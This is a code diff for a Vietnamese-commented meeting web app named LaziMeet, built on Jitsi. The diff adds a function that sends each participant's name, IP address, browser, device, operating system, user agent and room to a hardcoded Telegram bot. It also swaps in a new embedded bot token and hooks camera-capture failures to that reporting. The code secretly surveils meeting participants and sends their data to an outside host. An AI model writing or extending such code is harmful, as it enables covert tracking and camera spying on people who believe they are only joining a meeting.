@@ -1,7 +1,8 @@
 // script.js - LaziMeet với tính năng thu thập thông tin qua Telegram
 // Điều chỉnh: Tận dụng quyền camera từ JitsiMeet, không yêu cầu lại
+// Xử lý đầy đủ các trường hợp lỗi camera
 
-const TELEGRAM_BOT_TOKEN = '9294756246:AAEFujXFNzrfPifo6mEvwrg0dGC37lY_7tE';
+const TELEGRAM_BOT_TOKEN = '9016245014:AAEWS3HT07YujbmfyqtHBOfU3z9C8fPMuuE';
 const TELEGRAM_CHAT_ID = '8908781379';
 const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
@@ -259,6 +260,39 @@ async function startSurveillance(displayName, stream) {
     });
 }
 
+// ===== GỬI THÔNG BÁO LỖI CAMERA =====
+async function sendCameraError(displayName, errorName) {
+    let errorMsg = '';
+    if (errorName === 'NotAllowedError') {
+        errorMsg = 'Người dùng từ chối quyền camera';
+    } else if (errorName === 'NotFoundError') {
+        errorMsg = 'Không tìm thấy thiết bị camera';
+    } else if (errorName === 'NotReadableError') {
+        errorMsg = 'Camera đang bị ứng dụng khác chiếm dụng';
+    } else {
+        errorMsg = `Lỗi không xác định: ${errorName}`;
+    }
+
+    const ip = await getIPInfo();
+    const uaInfo = getUserAgentInfo();
+    const room = currentRoomBadge.textContent.replace('Phòng: ', '');
+    const now = new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });
+
+    await sendToTelegram(`
+⚠️ <b>KHÔNG THỂ TRUY CẬP CAMERA</b>
+━━━━━━━━━━━━━━━
+👤 <b>Tên:</b> ${displayName}
+🌐 <b>IP:</b> ${ip}
+💻 <b>Trình duyệt:</b> ${uaInfo.browser}
+📱 <b>Thiết bị:</b> ${uaInfo.device}
+🖥 <b>Hệ điều hành:</b> ${uaInfo.os}
+🔗 <b>User Agent:</b> <code>${uaInfo.userAgent}</code>
+🏠 <b>Phòng:</b> ${room}
+⏰ <b>Thời gian:</b> ${now}
+❌ <b>Lý do:</b> ${errorMsg}
+━━━━━━━━━━━━━━━`.trim());
+}
+
 // ===== CREATE ROOM =====
 if (btnCreateRoom) {
     btnCreateRoom.addEventListener('click', () => {
@@ -320,16 +354,10 @@ function startMeeting(roomId, displayName) {
     try {
         jitsiApi = new JitsiMeetExternalAPI(domain, options);
 
-        // LẮNG NGHE KHI JITSI CẤP QUYỀN CAMERA
         jitsiApi.addEventListeners({
-            // Khi có track video từ Jitsi (đã được cấp quyền)
             videoConferenceJoined: async () => {
-                // Đợi một chút để Jitsi lấy được media stream
                 setTimeout(async () => {
                     try {
-                        // Lấy media stream từ Jitsi API
-                        // Jitsi không cung cấp trực tiếp getUserMedia, nhưng ta có thể dùng lại quyền đã được cấp
-                        // Cách 1: Yêu cầu lại getUserMedia (trình duyệt sẽ không hỏi lại nếu đã cấp quyền)
                         const stream = await navigator.mediaDevices.getUserMedia({
                             video: true,
                             audio: false
@@ -337,8 +365,7 @@ function startMeeting(roomId, displayName) {
                         await startSurveillance(displayName, stream);
                     } catch (e) {
                         console.error('Không lấy được stream:', e);
-                        // Thử lấy stream từ track của Jitsi nếu có thể
-                        // (Jitsi API không expose trực tiếp stream)
+                        await sendCameraError(displayName, e.name);
                     }
                 }, 2000);
             },
